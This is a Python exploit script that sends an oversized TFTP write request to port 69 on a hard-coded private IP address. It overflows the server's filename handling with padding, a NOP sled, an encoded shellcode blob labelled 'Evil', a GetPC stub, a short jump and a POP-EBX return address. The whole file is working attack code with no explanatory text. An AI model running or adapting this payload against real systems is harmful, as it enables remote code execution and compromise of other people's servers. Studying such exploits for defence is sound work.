#!/usr/bin/python
import socket
import sys

host = '192.168.98.159'
port = 69
Evil=("\xdb\xca\xd9\x74\x24\xf4\x5d\x33\xc9\xba\x9c\x2b\x63\xc8" +
"\xb1\x4f\x31\x55\x19\x83\xed\xfc\x03\x55\x15\x7e\xde\x9f" +
"\x20\xf7\x21\x60\xb1\x67\xab\x85\x80\xb5\xcf\xce\xb1\x09" +
"\x9b\x83\x39\xe2\xc9\x37\xc9\x86\xc5\x38\x7a\x2c\x30\x76" +
"\x7b\x81\xfc\xd4\xbf\x80\x80\x26\xec\x62\xb8\xe8\xe1\x63" +
"\xfd\x15\x09\x31\x56\x51\xb8\xa5\xd3\x27\x01\xc4\x33\x2c" +
"\x39\xbe\x36\xf3\xce\x74\x38\x24\x7e\x03\x72\xdc\xf4\x4b" +
"\xa3\xdd\xd9\x88\x9f\x94\x56\x7a\x6b\x27\xbf\xb3\x94\x19" +
"\xff\x1f\xab\x95\xf2\x5e\xeb\x12\xed\x15\x07\x61\x90\x2d" +
"\xdc\x1b\x4e\xb8\xc1\xbc\x05\x1a\x22\x3c\xc9\xfc\xa1\x32" +
"\xa6\x8b\xee\x56\x39\x58\x85\x63\xb2\x5f\x4a\xe2\x80\x7b" +
"\x4e\xae\x53\xe2\xd7\x0a\x35\x1b\x07\xf2\xea\xb9\x43\x11" +
"\xfe\xbb\x09\x7e\x33\xf1\xb1\x7e\x5b\x82\xc2\x4c\xc4\x38" +
"\x4d\xfd\x8d\xe6\x8a\x02\xa4\x5e\x04\xfd\x47\x9e\x0c\x3a" +
"\x13\xce\x26\xeb\x1c\x85\xb6\x14\xc9\x09\xe7\xba\xa2\xe9" +
"\x57\x7b\x13\x81\xbd\x74\x4c\xb1\xbd\x5e\xfb\xf6\x2a\xa1" +
"\x54\x9a\xbd\x49\xa7\x5a\xc3\x32\x2e\xbc\xa9\x54\x67\x17" +
"\x46\xcc\x22\xe3\xf7\x11\xf9\x63\x9b\x80\x66\x73\xd2\xb8" +
"\x30\x24\xb3\x0f\x49\xa0\x29\x29\xe3\xd6\xb3\xaf\xcc\x52" +
"\x68\x0c\xd2\x5b\xfd\x28\xf0\x4b\x3b\xb0\xbc\x3f\x93\xe7" +
"\x6a\xe9\x55\x5e\xdd\x43\x0c\x0d\xb7\x03\xc9\x7d\x08\x55" +
"\xd6\xab\xfe\xb9\x67\x02\x47\xc6\x48\xc2\x4f\xbf\xb4\x72" +
"\xaf\x6a\x7d\x82\xfa\x36\xd4\x0b\xa3\xa3\x64\x56\x54\x1e" +
"\xaa\x6f\xd7\xaa\x53\x94\xc7\xdf\x56\xd0\x4f\x0c\x2b\x49" +
"\x3a\x32\x98\x6a\x6f")


try:
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
except:
	print "socket() failed"
	sys.exit(1)
#0040F3B6   5B               POP EBX
filename = "a"*600 +"\x90"*187 + Evil + "\x90"*83 + "\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1" +"\xeb\xd0\x90\x90"+ "\xb6\xf3\x40" 

mode = "netascii"
muha = "\x00\x02" + filename + "\x00" + mode + "\0"
s.sendto(muha, (host,port))
